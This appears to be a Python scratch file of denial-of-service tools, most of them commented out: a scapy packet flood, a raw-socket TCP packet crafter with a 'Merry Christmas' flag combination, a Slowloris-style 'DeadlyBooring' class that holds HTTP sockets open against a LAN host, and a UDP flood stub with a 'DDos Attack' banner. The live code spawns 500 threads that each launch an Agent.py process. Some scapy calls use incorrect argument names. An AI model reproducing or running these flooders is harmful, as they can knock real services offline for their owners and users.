# from scapy.all import *
# from scapy.layers.inet import TCP, IP
#
# source_IP = input("Enter IP address of Source: ")
# target_IP = input("Enter IP address of Target: ")
# source_port = int(input("Enter Source Port Number:"))
# i = 1
#
# while True:
#     IP1 = IP(source_IP=source_IP, destination=target_IP)
#     TCP1 = TCP(srcport=source_port, dstport=80)
#     pkt = IP1 / TCP1
#     send(pkt, inter=.001)
#
#     print("packet sent ", i)
#     i = i + 1
#
#
#
#
#
#
# import array
# import socket
# import struct
# from socket import *
#
#
# def chksum(packet: bytes) -> int:
#     if len(packet) % 2 != 0:
#         packet += b'\0'
#
#     res = sum(array.array("H", packet))
#     res = (res >> 16) + (res & 0xffff)
#     res += res >> 16
#
#     return (~res) & 0xffff
#
#
# class TCPPacket:
#     def __init__(self,
#                  src_host:  str,
#                  src_port:  int,
#                  dst_host:  str,
#                  dst_port:  int,
#                  flags:     int = 0):
#         self.src_host = src_host
#         self.src_port = src_port
#         self.dst_host = dst_host
#         self.dst_port = dst_port
#         self.flags = flags
#
#     def build(self) -> bytes:
#         packet = struct.pack(
#             '!HHIIBBHHH',
#             self.src_port,  # Source Port
#             self.dst_port,  # Destination Port
#             0,              # Sequence Number
#             0,              # Acknoledgement Number
#             5 << 4,         # Data Offset
#             self.flags,     # Flags
#             8192,           # Window
#             0,              # Checksum (initial value)
#             0               # Urgent pointer
#         )
#
#         pseudo_hdr = struct.pack(
#             '!4s4sHH',
#             socket.inet_aton(self.src_host),    # Source Address
#             socket.inet_aton(self.dst_host),    # Destination Address
#             socket.IPPROTO_TCP,                 # PTCL
#             len(packet)                         # TCP Length
#         )
#
#         checksum = chksum(pseudo_hdr + packet)
#
#         packet = packet[:16] + struct.pack('H', checksum) + packet[18:]
#
#         return packet
#
#
# if __name__ == '__main__':
#     # dst = gethostbyname('tsetmc.com')
#     dst = '192.168.0.192'
#
#     pak = TCPPacket(
#         '192.168.0.155',
#         8080,
#         dst,
#         8080,
#         0b000101001  # Merry Christmas!
#     )
#
#     s = socket.socket(socket.PF_PACKET, socket.SOCK_RAW, socket.IPPROTO_TCP)
#     # s = socket.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
#
#     s.sendto(pak.build(), (dst, 0))
#     print("done")


# import socket, random, time, sys
#
#
# class DeadlyBooring():
#     def __init__(self, ip, port=80, socketsCount=1):
#         self._ip = ip
#         self._port = port
#         self._headers = [
#             "User-Agent: Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.5) Gecko/20091102 Firefox/3.5.5 (.NET CLR 3.5.30729)",
#             "Accept-Language: en-us,en;q=0.5"
#         ]
#         # self._sockets = [self.newSocket() for _ in range(socketsCount)]
#         self._sockets = [self.newSocket()]
#
#     def getMessage(self, message):
#         return (message + "{} HTTP/1.1\r\n".format(str(random.randint(0, 2000)))).encode("utf-8")
#
#     def newSocket(self):
#         try:
#             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
#             s.settimeout(4)
#             s.connect((self._ip, self._port))
#             # s.connect(self._ip)
#             s.send('Hi'.encode())  # self.getMessage("Get /?"))
#             for header in self._headers:
#                 s.send(bytes(bytes("{}\r\n".format(header).encode("utf-8"))))
#             return s
#         except socket.error as se:
#             print("Error: "+str(se))
#             time.sleep(0.5)
#             return self.newSocket()
#
#     def attack(self, timeout=sys.maxsize, sleep=15):
#         t, i = time.time(), 0
#         while(time.time() - t < timeout):
#             for s in self._sockets:
#                 try:
#                     print("Sending request #{}".format(str(i)))
#                     s.send(self.getMessage("X-a: "))
#                     i += 1
#                 except socket.error as e:
#                     self._sockets.remove(s)
#                     self._sockets.append(self.newSocket())
#                 time.sleep(sleep/len(self._sockets))
#
#
# if __name__ == "__main__":
#     dos = DeadlyBooring("192.168.0.162", 3000, socketsCount=200)
#     dos.attack(timeout=60*10)

import sys
import os
import time
import socket
import websockets
import random
# Code Time
from datetime import datetime
import asyncio
import nest_asyncio
import multiprocessing
import threading
# from Agent import *
import subprocess

now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year


def do(j):
    os.system(f"python3.8 Agent.py {j}")
    # subprocess.call([f'Agent.py {j}'])
    # while True:
    # agent = Agent(j)
    # agent.hello()
    # subprocess.Popen(["python", "Agent.py"] + j)


array = []
threads = map(lambda i: threading.Thread(target=lambda: do(i)), range(1, 501))
print(threads)
for t in threads:
    t.start()
    time.sleep(1)

# for i in range(1, 3):
#     array.append(multiprocessing.Process(target=do(i), args=(i,)))
# for p in array:
#     p.start()
# print("Processes have been created.")

# class CreateLoop(multiprocessing.Process):
#     def __init__(self, uri):
#         multiprocessing.Process.__init__(self)
#         self._uri = uri
#         self._loop = asyncio.get_event_loop()
#
#     def start(self) -> None:
#         try:
#             self._loop.run_until_complete(self.ws_connect())
#             self._loop.run_forever()
#         except Exception as e:
#             print(e)
#
#     async def ws_connect(self):
#         try:
#             uri = self._uri
#             with websockets.connect(uri) as websocket:
#                 while True:
#                     try:
#                         greeting = websocket.recv()
#                         print(f"{greeting}")
#                     except:
#                         print('Server disconnected')
#                         print('Try to reconnect')
#                         websocket = websockets.connect(self._uri)
#         except Exception as e:
#             print(e)
#
#
# def ws_mp():
#     uri = "ws://192.168.0.155:8002"
#     processes = []
#     try:
#         for user in range(0, 2):
#             processes.append(CreateLoop(uri))
#         for each_p in processes:
#             each_p.start()
#         return "DONE"
#     except Exception as e:
#         print(e)
#
#
# ws_mp()
# print("End")

# async def hello():
#
#     uri = "ws://192.168.0.155:8002"
#     async with websockets.connect(uri) as websocket:
#
#         while True:
#             try:
#                 greeting = await websocket.recv()
#                 print(f"< {greeting}")
#             except Exception as e:
#                 print('Server disconnected', e)
#                 print('Try to reconnect')
#                 websocket = await websockets.connect(uri)
#
# asyncio.get_event_loop().run_until_complete(hello())
# asyncio.get_event_loop().run_forever()


##############
# sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
# sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
# bytes = random._urandom(1490)
# bytes = 'Merry Christmas'.encode()
#############

# os.system("clear")
# os.system("figlet DDos Attack")

# ip = '192.168.0.162'  # input("IP Target : ")
# ip = '192.168.0.155'
# port = 8000  # int(input("Port       : "))

# os.system("clear")
# os.system("figlet Attack Starting")
# print("[                    ] 0% ")
# time.sleep(1)
# print("[=====               ] 25%")
# time.sleep(1)
# print("[==========          ] 50%")
# time.sleep(1)
# print("[===============     ] 75%")
# time.sleep(1)
# print("[====================] 100%")
# time.sleep(1)
sent = 0
# sock.connect((ip, port))
# while True:
#     try:
# sock.sendto(bytes, (ip, port))
# sock.send(bytes)
#     sent = sent + 1
#     port = port + 1
#     print("Sent %s packet to %s throught port:%s" % (sent, ip, port))
#     if port == 65534:
#         port = 1
# except Exception as e:
#     print(e)
# 192.168.0.104   8000
